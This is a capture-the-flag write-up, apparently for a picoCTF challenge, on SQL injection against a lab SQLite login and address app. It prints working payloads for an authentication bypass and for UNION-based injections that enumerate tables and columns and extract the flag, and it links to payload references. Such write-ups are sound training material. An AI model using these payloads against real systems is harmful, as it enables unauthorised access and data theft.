### Login

At the start, we know that the website uses SQLi.

First input field is for a login and password.  
![login](https://raw.githubusercontent.com/olexamatej/picoctf/master/More_SQLi/imgs/image-2.png)  

After inputing data, it shows us the SQL query it uses, that gives us information that we can use 
~~~sql
' OR 1=1 --
~~~
 as a input. We only need it in password field, because password is checked first and '--' makes it so everything after it is commented out.

This logs us in.
## Adresses

Logging in displays a list of addresses with phone numbers, which are essentially meaningless. We can begin by confirming the number of columns.

![adresses](https://raw.githubusercontent.com/olexamatej/picoctf/master/More_SQLi/imgs/image-8.png)


### Base Exploit  

This is how our exploit (union injection) will work.

1. **`-1`**: This is an ID that is never used.
2. **`'`**: Ends the input string and allows us to start our own query.
3. **Injected Query**: This is where we insert our custom SQL query.
4. **`--`**: Used to comment out the rest of the line, ensuring the original query is ignored.

This style will be also used for the rest of this CTF.


### Exploiting DB
So our final command for confirming columns is :
~~~sql
-1'UNION SELECT 1,2,3--
~~~

![columns](https://raw.githubusercontent.com/olexamatej/picoctf/master/More_SQLi/imgs/image.png)


Now it would be good to check version of our sqli_lite DB, we can change our previous command a little bit  
~~~sql
-1' UNION SELECT sqlite_version(),2,3--+
~~~
![version](https://raw.githubusercontent.com/olexamatej/picoctf/master/More_SQLi/imgs/image-1.png)

Now we can check ExploitDB or google a little bit for finding exploits of this particular version.

I have found and used these 2 for this CTF.

~~~
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md  
	
https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf
~~~


Now we can use queries from these 2 links for rest of the CTF.

For finding tables we shall use :
~~~sql
-1' UNION SELECT 1,group_concat(tbl_name),3 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--
~~~

![tables](https://raw.githubusercontent.com/olexamatej/picoctf/master/More_SQLi/imgs/image-3.png)

Then we know, that our tables are  
`users,offices,hints,more_table`

After that, we need to gain names of table columns.

~~~sql
-1' union SELECT 1,sql,3 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='more_table' --
~~~

![columns](https://raw.githubusercontent.com/olexamatej/picoctf/master/More_SQLi/imgs/image-6.png)

The output is query that was used to create that table, in our case :
~~~sql
CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)
~~~
From this, we know that more_table has two columns, one is `id` and the second one is `flag` in TEXT format.
It is pretty self-explanatory.

Our final injection is getting the flag from table.

~~~sql
-1' union Select 1,flag,3 from more_table --
~~~
![alt text](https://raw.githubusercontent.com/olexamatej/picoctf/master/More_SQLi/imgs/image-7.png)


